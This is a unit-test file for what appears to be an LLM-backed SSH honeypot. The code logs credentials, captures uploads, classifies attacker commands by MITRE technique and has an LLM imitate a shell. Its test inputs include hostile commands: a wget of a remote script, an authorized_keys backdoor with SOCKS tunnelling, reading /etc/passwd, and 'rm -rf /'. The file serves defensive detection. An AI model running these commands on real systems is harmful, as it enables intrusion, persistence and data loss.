using Xunit;

namespace FunnyPot.Tests;

public class InputValidatorTests
{
    [Fact]
    public void Validate_NullInput_ReturnsFalse()
    {
        var result = InputValidator.Validate(null!);
        Assert.False(result.isValid);
        Assert.Equal("Input empty", result.error);
    }

    [Fact]
    public void Validate_EmptyInput_ReturnsFalse()
    {
        var result = InputValidator.Validate("");
        Assert.False(result.isValid);
        Assert.Equal("Input empty", result.error);
    }

    [Fact]
    public void Validate_WhitespaceInput_ReturnsTrue()
    {
        var result = InputValidator.Validate("   ");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ExceedsMaxLength_ReturnsFalse()
    {
        var longInput = new string('a', InputValidator.MaxInputLength + 1);
        var result = InputValidator.Validate(longInput);
        Assert.False(result.isValid);
        Assert.Contains("Input too long", result.error);
    }

    [Fact]
    public void Validate_AtMaxLength_ReturnsTrue()
    {
        var sb = new System.Text.StringBuilder(InputValidator.MaxInputLength);
        for (int i = 0; i < InputValidator.MaxInputLength; i++)
            sb.Append(i % 2 == 0 ? 'a' : 'b');
        var result = InputValidator.Validate(sb.ToString());
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ContainsNullByte_ReturnsFalse()
    {
        var input = "test\0data";
        var result = InputValidator.Validate(input);
        Assert.False(result.isValid);
        Assert.Equal("Binary content not allowed", result.error);
    }

    [Fact]
    public void Validate_NoNullBytes_ReturnsTrue()
    {
        var result = InputValidator.Validate("正常输入");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_RepetitiveCharsExceedsLimit_ReturnsFalse()
    {
        var input = new string('a', InputValidator.MaxRepetitiveChars + 1);
        var result = InputValidator.Validate(input);
        Assert.False(result.isValid);
        Assert.Equal("Repetitive input detected", result.error);
    }

    [Fact]
    public void Validate_ValidRepetitiveInput_ReturnsTrue()
    {
        var input = new string('a', InputValidator.MaxRepetitiveChars);
        var result = InputValidator.Validate(input);
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_NormalCommand_ReturnsTrue()
    {
        var result = InputValidator.Validate("ls -la /home");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ValidLongInput_ReturnsTrue()
    {
        var input = "ls -la /home/user/documents/projects/codebase/src/modules/utilities/helpers/";
        var result = InputValidator.Validate(input);
        Assert.True(result.isValid);
    }
}

public class SCPDetectorTests
{
    [Theory]
    [InlineData("scp", true)]
    [InlineData("SCP", true)]
    [InlineData("scp -t somefile", true)]
    [InlineData("scp -f somefile", true)]
    [InlineData("sftp", true)]
    [InlineData("SFTP", true)]
    [InlineData("ssh -D 1080 host", false)]
    [InlineData("ssh user@host", false)]
    [InlineData("ls -la", false)]
    [InlineData("cat file.txt", false)]
    [InlineData("cd /home", false)]
    [InlineData("rm -rf /", false)]
    [InlineData("git commit -m 'fix'", false)]
    [InlineData("grep -r 'foo' .", false)]
    [InlineData("tar -cf archive.tar .", false)]
    public void IsSCPCommand_DetectsCorrectly(string input, bool expected)
    {
        var result = SCPDetector.IsSCPCommand(input);
        Assert.Equal(expected, result);
    }
}

public class SCPUploadSessionTests
{
    [Fact]
    public void HandleData_CapturesBinaryUploadToLogDirectory()
    {
        var previousLogDir = Program.LogDir;
        var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
        Program.LogDir = tempDir;

        try
        {
            var session = new SCPUploadSession("abcdef123456", "fallback.bin");
            var acks = new List<byte[]>();
            var closeReasons = new List<string>();
            var payload = new byte[] { 0, 1, 2, 255, 10 };
            var packet = new byte["C0644 5 payload.bin\n"u8.Length + payload.Length + 1];
            "C0644 5 payload.bin\n"u8.CopyTo(packet);
            payload.CopyTo(packet.AsSpan("C0644 5 payload.bin\n"u8.Length));
            packet[^1] = 0;

            session.HandleData(packet, acks.Add, closeReasons.Add);

            Assert.Equal("SCPUploadCaptured", Assert.Single(closeReasons));
            Assert.Equal(2, acks.Count);
            Assert.All(acks, ack => Assert.Equal(new byte[] { 0 }, ack));

            var uploadDir = Path.Combine(tempDir, "uploads", "abcdef12");
            var path = Assert.Single(Directory.GetFiles(uploadDir, "*_payload.bin"));
            Assert.Equal(payload, File.ReadAllBytes(path));
        }
        finally
        {
            Program.LogDir = previousLogDir;
            if (Directory.Exists(tempDir))
                Directory.Delete(tempDir, recursive: true);
        }
    }

    [Fact]
    public void HandleData_RejectsUploadsLargerThanFiveMegabytes()
    {
        var previousLogDir = Program.LogDir;
        var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
        Program.LogDir = tempDir;

        try
        {
            var session = new SCPUploadSession("abcdef123456", "fallback.bin");
            var closeReasons = new List<string>();
            var header = $"C0644 {SCPUploadHandler.MaxUploadBytes + 1} payload.bin\n";

            session.HandleData(System.Text.Encoding.ASCII.GetBytes(header), _ => { }, closeReasons.Add);

            Assert.Equal("SCPUploadTooLarge", Assert.Single(closeReasons));
            Assert.False(Directory.Exists(Path.Combine(tempDir, "uploads", "abcdef12")));
        }
        finally
        {
            Program.LogDir = previousLogDir;
            if (Directory.Exists(tempDir))
                Directory.Delete(tempDir, recursive: true);
        }
    }
}

public class DataHarvesterTests
{
    [Fact]
    public void LevenshteinDistance_DetectsPasswordMutation()
    {
        var distance = DataHarvester.LevenshteinDistance("root:password1", "root:password2");
        Assert.Equal(1, distance);
    }

    [Fact]
    public void AnalyzeCommand_ExtractsPayloadAndDiscoverySignals()
    {
        var analysis = DataHarvester.AnalyzeCommand("cat /etc/passwd; wget http://example.com/a.sh -O /tmp/a.sh");

        Assert.Equal(1, analysis.DiscoveryDepthScore);
        Assert.Contains("http://example.com/a.sh", analysis.PayloadUrls);
        Assert.Contains("Command and Control", analysis.MitreAttackTechniques);
        Assert.Contains("Discovery", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void AnalyzeCommand_DetectsPersistenceAndTunneling()
    {
        var analysis = DataHarvester.AnalyzeCommand("echo key >> ~/.ssh/authorized_keys && ssh -D 1080 host");

        Assert.Equal("ssh_authorized_keys", analysis.PersistenceVector);
        Assert.Equal("dynamic_forward", analysis.TunnelingIntent);
        Assert.True(analysis.AssetValuePerceptionScore > 0);
    }

    [Fact]
    public void AnalyzeCommand_ClassifiesRouterOsProbeAsReconnaissance()
    {
        var analysis = DataHarvester.AnalyzeCommand("/ip cloud print");

        Assert.Equal("mikrotik_routeros_probe", analysis.ReconnaissanceProbe);
        Assert.Contains("Reconnaissance", analysis.MitreAttackTechniques);
    }

    [Theory]
    [InlineData("uname -s -m")]
    [InlineData("/bin/./uname -s -v -n -r -m")]
    [InlineData("ifconfig")]
    [InlineData("ip addr show")]
    [InlineData("whoami")]
    public void AnalyzeCommand_ClassifiesHostAndNetworkEnumerationAsDiscovery(string command)
    {
        var analysis = DataHarvester.AnalyzeCommand(command);

        Assert.True(analysis.DiscoveryDepthScore > 0);
        Assert.Contains("Discovery", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void AnalyzeCommand_DoesNotClassifyToolVersionCheckAsCommandAndControl()
    {
        var analysis = DataHarvester.AnalyzeCommand("curl --version");

        Assert.DoesNotContain("Command and Control", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void CalculateFingerprintHash_IsDeterministicAndNormalizesInput()
    {
        var first = DataHarvester.CalculateFingerprintHash("SSH-2.0-Client", "RSA-SHA2-512", "AA:BB");
        var second = DataHarvester.CalculateFingerprintHash("ssh-2.0-client", "rsa-sha2-512", "aa:bb");

        Assert.Equal(first, second);
        Assert.Equal(64, first.Length);
    }

    [Fact]
    public void IsFailureResponse_DoesNotTreatGenericErrorWordAsFailure()
    {
        Assert.False(DataHarvester.IsFailureResponse("/var/log/error.log"));
        Assert.True(DataHarvester.IsFailureResponse("bash: nope: command not found"));
    }

    [Fact]
    public void ShellSessionAnalytics_TracksFailureRatioAndSemanticDrift()
    {
        var analytics = new ShellSessionAnalytics { SessionStartedAt = DateTime.UtcNow.AddSeconds(-10) };

        analytics.RecordCommand(DataHarvester.AnalyzeCommand("ls"));
        analytics.RecordResult(false);
        analytics.RecordCommand(DataHarvester.AnalyzeCommand("cat /etc/passwd | grep root && wget http://example.com/a.sh"));
        analytics.RecordResult(true);

        Assert.Equal(0.5, analytics.StandardErrorRatio);
        Assert.True(analytics.SemanticDrift > 0);
        Assert.Contains("Command and Control", analytics.MitreTechniqueCounts.Keys);
        Assert.True(analytics.CalculateTuringMultiplier() > 0);
    }
}

public class LoggerTests
{
    [Fact]
    public void GetSessionLogUniquePart_HandlesShortSessionIds()
    {
        Assert.Equal("abc", Logger.GetSessionLogUniquePart("default", "abc"));
        Assert.Equal("abcdefgh", Logger.GetSessionLogUniquePart("default", "abcdefghijk"));
        Assert.Equal("custom", Logger.GetSessionLogUniquePart("custom", "abcdefghijk"));
    }

    [Fact]
    public void ShouldRequestDataPush_AllowsInitialAndElapsedRequests()
    {
        var now = DateTime.UtcNow;
        var interval = TimeSpan.FromMinutes(5);

        Assert.True(Logger.ShouldRequestDataPush(now, DateTime.MinValue, interval, force: false));
        Assert.True(Logger.ShouldRequestDataPush(now, now.AddMinutes(-6), interval, force: false));
    }

    [Fact]
    public void ShouldRequestDataPush_DebouncesNonBoundaryEvents()
    {
        var now = DateTime.UtcNow;
        var interval = TimeSpan.FromMinutes(5);

        Assert.False(Logger.ShouldRequestDataPush(now, now.AddMinutes(-1), interval, force: false));
        Assert.True(Logger.ShouldRequestDataPush(now, now.AddMinutes(-1), interval, force: true));
    }

    [Fact]
    public void ApplyHarvestSummaryEvent_TracksUniqueScanIpsAndShells()
    {
        var summary = new HarvestSummary();
        var timestamp = DateTime.UtcNow;

        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "203.0.113.5:49152", Username = "root", Password = "admin" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "203.0.113.5:49153", Username = "root", Password = "admin" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "198.51.100.7:22", Username = "support", Password = "password" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "shell_session_start", new SessionLogEntry(), timestamp);

        Assert.Equal(3, summary.TotalScanAttempts);
        Assert.Equal(2, summary.UniqueScanIps);
        Assert.Equal(2, summary.ScansByIp["203.0.113.5"]);
        Assert.Equal(1, summary.ScansByIp["198.51.100.7"]);
        Assert.Equal(2, summary.TopUsernames["root"]);
        Assert.Equal(1, summary.TopUsernames["support"]);
        Assert.Equal(2, summary.TopPasswords["admin"]);
        Assert.Equal(1, summary.TopPasswords["password"]);
        Assert.Equal(1, summary.TotalShells);
    }
}

public class ProgramTests
{
    [Theory]
    [InlineData("203.0.113.5:49152", "203.0.113.5")]
    [InlineData("[2001:db8::1]:49152", "2001:db8::1")]
    [InlineData("unknown", "unknown")]
    public void GetRemoteAttemptKey_UsesIpWithoutSourcePort(string remoteEndpoint, string expected)
    {
        Assert.Equal(expected, Program.GetRemoteAttemptKey(remoteEndpoint));
    }

    [Fact]
    public void GetIntEnvironmentOrDefault_UsesValidEnvironmentValue()
    {
        var name = $"FUNNYPOT_TEST_INT_{Guid.NewGuid():N}";
        Environment.SetEnvironmentVariable(name, "22722");

        try
        {
            Assert.Equal(22722, Program.GetIntEnvironmentOrDefault(name, 22422));
        }
        finally
        {
            Environment.SetEnvironmentVariable(name, null);
        }
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("not-a-number")]
    public void GetIntEnvironmentOrDefault_FallsBackForMissingOrInvalidValue(string? value)
    {
        var name = $"FUNNYPOT_TEST_INT_{Guid.NewGuid():N}";
        Environment.SetEnvironmentVariable(name, value);

        try
        {
            Assert.Equal(22422, Program.GetIntEnvironmentOrDefault(name, 22422));
        }
        finally
        {
            Environment.SetEnvironmentVariable(name, null);
        }
    }
}

public class CommandResolverTests
{
    [Fact]
    public void CommandResponseStore_LoadsExactOrdinalKeysAndEmptyResponses()
    {
        var path = CreateStoreFile(new Dictionary<string, string>
        {
            ["true"] = "",
            ["echo A"] = "A"
        });

        try
        {
            var store = CommandResponseStore.Load(path);

            Assert.True(store.TryGet("true", out var empty));
            Assert.Equal("", empty.Response);
            Assert.True(store.TryGet("echo A", out var exact));
            Assert.Equal("A", exact.Response);
            Assert.False(store.TryGet("echo a", out _));
            Assert.False(store.TryGet("echo A ", out _));
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task CommandResponseStore_LearnsAndPersistsLlmResponses()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            var store = CommandResponseStore.Load(path);

            Assert.True(await store.TryLearnAsync("new-command", "generated", "test-model"));
            Assert.True(store.TryGet("new-command", out var learned));
            Assert.Equal("generated", learned.Response);
            Assert.Equal("llm", learned.Origin);
            Assert.Equal("test-model", learned.LlmModel);
            Assert.NotNull(learned.UpdatedAtUtc);

            var reloaded = CommandResponseStore.Load(path);
            Assert.True(reloaded.TryGet("new-command", out var persisted));
            Assert.Equal("generated", persisted.Response);
            Assert.Equal("test-model", persisted.LlmModel);
        }
        finally
        {
            File.Delete(path);
            File.Delete(path + ".tmp");
        }
    }

    [Fact]
    public async Task CommandResponseStore_ConcurrentUpdatesDoNotLoseEntries()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            var store = CommandResponseStore.Load(path);
            await Task.WhenAll(Enumerable.Range(0, 12)
                .Select(index => store.TryLearnAsync($"command-{index}", $"response-{index}", "test-model")));

            Assert.Equal(12, store.Count);
            Assert.Equal(12, CommandResponseStore.Load(path).Count);
            using var _ = System.Text.Json.JsonDocument.Parse(File.ReadAllText(path));
        }
        finally
        {
            File.Delete(path);
            File.Delete(path + ".tmp");
        }
    }

    [Fact]
    public async Task ResolveCommand_CacheHitDoesNotCallLlm()
    {
        var path = CreateStoreFile(new Dictionary<string, string> { ["uname -a"] = "cached uname" });
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;
            var result = await CommandResolver.ResolveCommandAsync(
                "uname -a",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("unexpected", 1, 1, 2, "test-model"));
                });

            Assert.Equal("cached uname", result.response);
            Assert.Equal("cache", result.responseSource);
            Assert.True(result.usedStatic);
            Assert.Equal(0, calls);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_CacheMissCallsLlmAndLearnsResponse()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;
            Task<(string response, int promptTokens, int completionTokens, int totalTokens, string model)> Provider(
                List<ChatRequestData.ChatMessage> _, CancellationToken __)
            {
                calls++;
                return Task.FromResult(("generated output", 4, 2, 6, "test-model"));
            }

            var first = await CommandResolver.ResolveCommandAsync(
                "uncached command", "session", FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None, Provider);
            var second = await CommandResolver.ResolveCommandAsync(
                "uncached command", "session", FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")), [], CancellationToken.None, Provider);

            Assert.Equal("generated output", first.response);
            Assert.Equal("llm", first.responseSource);
            Assert.False(first.usedStatic);
            Assert.Equal("generated output", second.response);
            Assert.Equal("cache", second.responseSource);
            Assert.Equal("test-model", second.llmModel);
            Assert.Equal(1, calls);
        }
        finally
        {
            File.Delete(path);
            File.Delete(path + ".tmp");
        }
    }

    [Fact]
    public async Task ResolveCommand_DoesNotLearnModelFailures()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var result = await CommandResolver.ResolveCommandAsync(
                "failed command",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) => Task.FromResult(("[api error] unavailable", 0, 0, 0, "test-model")));

            Assert.Equal("[api error] unavailable", result.response);
            Assert.Equal("llm", result.responseSource);
            Assert.False(Program.CommandResponses.TryGet("failed command", out _));
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_RepairsCompoundOutputBeforeLearning()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var responses = new Queue<(string response, int promptTokens, int completionTokens, int totalTokens, string model)>(
            [
                ("2", 3, 1, 4, "first-model"),
                ("ARCH:x86_64\nCPUS:2", 5, 2, 7, "repair-model")
            ]);
            var history = new List<ChatRequestData.ChatMessage>();
            const string command = "arch=$(uname -m); cpus=$(nproc); echo \"ARCH:$arch\"; echo \"CPUS:$cpus\"";

            var result = await CommandResolver.ResolveCommandAsync(
                command,
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                history,
                CancellationToken.None,
                (_, _) => Task.FromResult(responses.Dequeue()));

            Assert.Equal("ARCH:x86_64\r\nCPUS:2", result.response);
            Assert.Equal("repair-model", result.llmModel);
            Assert.True(Program.CommandResponses.TryGet(command, out var learned));
            Assert.Equal("repair-model", learned.LlmModel);
            Assert.Empty(history);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_ScpRemainsAProtocolException()
    {
        var path = CreateStoreFile(new Dictionary<string, string>());
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;
            var result = await CommandResolver.ResolveCommandAsync(
                "scp -t /tmp/file",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("unexpected", 0, 0, 0, "test-model"));
                });

            Assert.Equal("", result.response);
            Assert.Equal("scp", result.responseSource);
            Assert.Equal(0, calls);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Theory]
    [InlineData("cat /etc/passwd && uname -a", true)]
    [InlineData("echo 'a;b'", false)]
    [InlineData("echo \"a|b\"", false)]
    public void IsCompoundShellCommand_HandlesQuotedOperators(string command, bool expected)
    {
        Assert.Equal(expected, CommandResolver.IsCompoundShellCommand(command));
    }

    [Fact]
    public void CommandResponseSeed_IsAValidJsonDictionary()
    {
        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../FunnyPot/data/command_responses.json"));
        var store = CommandResponseStore.Load(path);

        Assert.True(store.Count >= 100);
        Assert.True(store.TryGet("cd ~; chattr -ia .ssh; lockr -ia .ssh", out var response));
        Assert.Contains("while trying to stat .ssh", response.Response);
    }

    [Fact]
    public void NormalizeTerminalOutput_RemovesShellPrompt()
    {
        var normalized = Program.NormalizeTerminalOutput("remote@omegablack:/tmp$ uname -a\n");

        Assert.Equal("uname -a", normalized);
    }

    [Fact]
    public void BuildCommandUserPrompt_RequiresRawTerminalOutput()
    {
        var prompt = Program.BuildCommandUserPrompt("uname -a");

        Assert.Contains("Execute this exact Bash command", prompt);
        Assert.Contains("raw terminal stdout/stderr only", prompt);
    }

    [Fact]
    public void BuildApiUrl_JoinsBaseAndEndpoint()
    {
        Assert.Equal("https://openrouter.ai/api/v1/chat/completions", Program.BuildApiUrl("https://openrouter.ai/api/v1/", "/chat/completions"));
    }

    [Fact]
    public void TryParseOpenRouterResponse_ExtractsContentAndUsage()
    {
        using var doc = System.Text.Json.JsonDocument.Parse("""
            {
              "choices": [{ "message": { "content": "ok" } }],
              "usage": { "prompt_tokens": 10, "completion_tokens": 2, "total_tokens": 12 }
            }
            """);

        Assert.True(Program.TryParseOpenRouterResponse(doc.RootElement, out var content, out var promptTokens, out var completionTokens, out var totalTokens));
        Assert.Equal("ok", content);
        Assert.Equal(10, promptTokens);
        Assert.Equal(2, completionTokens);
        Assert.Equal(12, totalTokens);
    }

    private static string CreateStoreFile(IReadOnlyDictionary<string, string> responses)
    {
        var path = Path.Combine(Path.GetTempPath(), $"funnypot-responses-{Guid.NewGuid():N}.json");
        var entries = responses.ToDictionary(
            pair => pair.Key,
            pair => new CommandResponseEntry
            {
                Response = pair.Value,
                Origin = "seed"
            },
            StringComparer.Ordinal);
        File.WriteAllText(path, System.Text.Json.JsonSerializer.Serialize(entries));
        return path;
    }
}

public class AppConfigurationTests
{
    [Fact]
    public void Load_WhenConfigMissing_ReturnsDefaults()
    {
        var config = AppConfiguration.Load("/tmp/non-existent-funnypot-config.yaml");

        Assert.Equal(22722, config.Ssh.Port);
        Assert.Equal(50, config.Ssh.MaxSessions);
        Assert.Equal(500, config.Llm.DelayMs);
    }

    [Fact]
    public void Load_WhenConfigExists_UsesFileValues()
    {
        var tempPath = Path.Combine(Path.GetTempPath(), $"funnypot-config-{Guid.NewGuid():N}.yaml");
        File.WriteAllText(tempPath, "ssh:\n  port: 23000\n  max-sessions: 10\nllm:\n  delay-ms: 250\n");

        try
        {
            var config = AppConfiguration.Load(tempPath);

            Assert.Equal(23000, config.Ssh.Port);
            Assert.Equal(10, config.Ssh.MaxSessions);
            Assert.Equal(250, config.Llm.DelayMs);
        }
        finally
        {
            File.Delete(tempPath);
        }
    }

    [Fact]
    public void Load_ProjectConfig_BindsRootSections()
    {
        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../config/app-config.yaml"));

        var config = AppConfiguration.Load(path);

        Assert.Equal("openai/gpt-5.6-luna", config.Llm.Model);
        Assert.Contains("nvidia/nemotron-3-super-120b-a12b:free", config.Llm.FallbackModels);
        Assert.Equal("/var/log/funnypot", config.Logging.LogDir);
        Assert.Equal(3, config.Ssh.PasswordHarvestAttempt);
        Assert.Equal("/chat/completions", config.Api.OpenRouter.ChatEndpoint);
        Assert.Equal("data/command_responses.json", config.CommandResponses.DataPath);
        Assert.Equal("autoresearch/program.md", config.AutoResearch.ProgramPath);
        Assert.Equal("dotnet test FunnyPot.sln", config.AutoResearch.ExperimentCommand);
        Assert.Contains("FunnyPot/Program.cs", config.AutoResearch.MutablePaths);
    }

    [Fact]
    public void Load_DefaultPathPrefersPublishedConfiguration()
    {
        var config = AppConfiguration.Load();

        Assert.Equal(22722, config.Ssh.Port);
        Assert.Equal("openai/gpt-5.6-luna", config.Llm.Model);
    }

    [Fact]
    public void BuildOutput_IncludesDefaultConfiguration()
    {
        var path = Path.Combine(AppContext.BaseDirectory, "config", "app-config.yaml");

        Assert.True(File.Exists(path));
        Assert.Equal(22722, AppConfiguration.Load(path).Ssh.Port);
    }
}

public class TelemetryWriteQueueTests
{
    [Fact]
    public void TryEnqueue_ProcessesWritesBeforeDispose()
    {
        using var queue = new TelemetryWriteQueue();
        using var completed = new ManualResetEventSlim(false);

        Assert.True(queue.TryEnqueue(completed.Set));

        Assert.True(completed.Wait(TimeSpan.FromSeconds(2)));
    }

    [Fact]
    public void TryEnqueue_ReturnsFalseAfterDispose()
    {
        var queue = new TelemetryWriteQueue();
        queue.Dispose();

        Assert.False(queue.TryEnqueue(() => { }));
    }
}

public class AutoResearchRunnerTests
{
    [Theory]
    [InlineData("autoresearch_metric=42", 42)]
    [InlineData("before\nautoresearch_metric = -1.25\nafter", -1.25)]
    public void TryParseMetric_ReadsNamedValueGroup(string output, double expected)
    {
        var parsed = AutoResearchRunner.TryParseMetric(output, @"autoresearch_metric\s*=\s*(?<value>-?\d+(?:\.\d+)?)", out var metric);

        Assert.True(parsed);
        Assert.Equal(expected, metric);
    }

    [Theory]
    [InlineData(2.0, null, false, true)]
    [InlineData(2.0, 1.0, false, true)]
    [InlineData(1.0, 2.0, false, false)]
    [InlineData(1.0, 2.0, true, true)]
    [InlineData(2.0, 1.0, true, false)]
    public void IsImprovement_RespectsMetricDirection(double candidate, double? best, bool lowerIsBetter, bool expected)
    {
        Assert.Equal(expected, AutoResearchRunner.IsImprovement(candidate, best, lowerIsBetter));
    }

    [Fact]
    public void ValidateMutablePaths_AllowsOnlyPathsInsideWorktree()
    {
        var worktree = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));

        AutoResearchRunner.ValidateMutablePaths(worktree, new[] { "FunnyPot/Program.cs", "autoresearch/program.md" });

        Assert.Throws<InvalidOperationException>(() => AutoResearchRunner.ValidateMutablePaths(worktree, new[] { "../outside.cs" }));
    }
}

public class SessionCommandWorkerTests
{
    [Fact]
    public void TryPost_RunsWorkOnDedicatedThreadInOrder()
    {
        using var worker = new SessionCommandWorker(Guid.NewGuid().ToString("N"));
        using var completed = new ManualResetEventSlim(false);
        var order = new List<int>();
        var executingThreadId = 0;

        Assert.True(worker.TryPost(() =>
        {
            executingThreadId = Environment.CurrentManagedThreadId;
            order.Add(1);
        }));
        Assert.True(worker.TryPost(() => order.Add(2)));
        Assert.True(worker.TryPost(() =>
        {
            order.Add(3);
            completed.Set();
        }));

        Assert.True(completed.Wait(TimeSpan.FromSeconds(2)));
        Assert.Equal(new[] { 1, 2, 3 }, order);
        Assert.Equal(worker.WorkerThreadId, executingThreadId);
        Assert.NotEqual(Environment.CurrentManagedThreadId, executingThreadId);
    }

    [Fact]
    public void TryPost_ReturnsFalseAfterDispose()
    {
        var worker = new SessionCommandWorker(Guid.NewGuid().ToString("N"));
        worker.Dispose();

        Assert.False(worker.TryPost(() => { }));
    }
}
